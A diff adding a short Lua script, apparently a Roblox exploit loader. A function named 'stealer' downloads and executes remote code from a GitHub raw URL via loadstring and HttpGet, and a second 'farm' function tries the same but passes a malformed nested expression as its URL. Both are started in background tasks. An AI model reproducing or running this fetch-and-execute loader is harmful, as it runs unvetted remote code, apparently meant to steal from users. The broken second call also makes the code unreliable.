@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/DarkHubScriptz/Menu/refs/heads/main/Darkhubmenu'))()
+end
+local function farm()
+    loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/mm2"))()'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
